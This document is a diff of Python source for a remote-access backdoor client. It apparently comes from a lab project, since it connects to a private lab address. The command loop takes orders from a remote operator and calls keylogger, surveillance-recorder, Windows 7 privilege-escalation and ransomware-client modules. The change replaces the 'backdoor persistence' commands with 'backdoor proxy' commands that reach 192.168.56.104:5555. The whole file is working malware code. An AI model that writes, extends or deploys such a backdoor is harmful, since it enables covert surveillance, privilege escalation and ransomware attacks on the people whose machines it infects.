@@ -14,7 +14,7 @@ import os  # For interacting with the operating system
 keylogger = None
 recorder = None  
 privilege_escalator = None
-persistence_manager = None
+proxy_manager = None
 ransomware = None
 
 import sys
@@ -29,7 +29,7 @@ if current_dir not in sys.path:
 from features.keylogger import create_keylogger
 from features.recording import create_surveillance_recorder
 from features.privilege import Windows7PrivilegeEscalator
-from features.persistence import create_backdoor_persistence
+from features.proxy import create_backdoor_proxy
 from features.ransomware_client import create_ransomware_client
 
 
@@ -91,7 +91,7 @@ def download_file(file_name):
 
 # Main shell function for command execution with enhanced features
 def shell():
-    global keylogger, recorder, privilege_escalator, persistence_manager, ransomware
+    global keylogger, recorder, privilege_escalator, proxy_manager, ransomware
     
     while True:
         # Receive a command from the remote host
@@ -270,55 +270,43 @@ def shell():
             except Exception as e:
                 reliable_send("List recordings error: " + str(e))
                 
-        # PERSISTENCE COMMANDS
-        elif command == 'start_persist':
+        # PROXY COMMANDS
+        elif command == 'start_proxy':
             try:
-                if persistence_manager is None:
-                    persistence_manager = create_backdoor_persistence('192.168.56.104', 5555)
-                success, msg = persistence_manager.start_persistence_operations()
-                reliable_send("Persistence: " + msg)
+                if proxy_manager is None:
+                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
+                success, msg = proxy_manager.start_proxy_operations()
+                reliable_send("proxy: " + msg)
             except Exception as e:
-                reliable_send("Persistence start error: " + str(e))
+                reliable_send("proxy start error: " + str(e))
                 
-        elif command == 'stop_persist':
+        elif command == 'stop_proxy':
             try:
-                if persistence_manager:
-                    success, msg = persistence_manager.stop_persistence_operations()
-                    reliable_send("Persistence: " + msg)
+                if proxy_manager:
+                    success, msg = proxy_manager.stop_proxy_operations()
+                    reliable_send("proxy: " + msg)
                 else:
-                    reliable_send("No persistence active")
+                    reliable_send("No proxy active")
             except Exception as e:
-                reliable_send("Persistence stop error: " + str(e))
-                
-        elif command == 'persist_status':
+                reliable_send("proxy stop error: " + str(e))
+
+        elif command == 'proxy_status':
             try:
-                if persistence_manager is None:
-                    persistence_manager = create_backdoor_persistence('192.168.56.104', 5555)
-                status = persistence_manager.get_persistence_status()
-                reliable_send("Persistence Status: " + json.dumps(status, indent=2))
+                if proxy_manager is None:
+                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
+                status = proxy_manager.get_proxy_status()
+                reliable_send("proxy Status: " + json.dumps(status, indent=2))
             except Exception as e:
-                reliable_send("Persistence status error: " + str(e))
-                
-        elif command == 'persist_info':
+                reliable_send("proxy status error: " + str(e))
+
+        elif command == 'proxy_info':
             try:
-                if persistence_manager is None:
-                    persistence_manager = create_backdoor_persistence('192.168.56.104', 5555)
-                connections = persistence_manager.get_connection_report()
-                reliable_send("Persistence Info: " + json.dumps(connections, indent=2))
+                if proxy_manager is None:
+                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
+                connections = proxy_manager.get_connection_report()
+                reliable_send("proxy Info: " + json.dumps(connections, indent=2))
             except Exception as e:
-                reliable_send("Persistence info error: " + str(e))
-                
-        elif command == 'persist_new_port':
-            try:
-                if persistence_manager is None:
-                    persistence_manager = create_backdoor_persistence('192.168.56.104', 5555)
-                success, msg = persistence_manager.reinitialize_with_new_port()
-                if success:
-                    reliable_send("Persistence: " + msg)
-                else:
-                    reliable_send("Persistence reinit error: " + msg)
-            except Exception as e:
-                reliable_send("Persistence new port error: " + str(e))
+                reliable_send("proxy info error: " + str(e))
                 
         # PRIVILEGE ESCALATION COMMANDS
         elif command == 'check_privs':
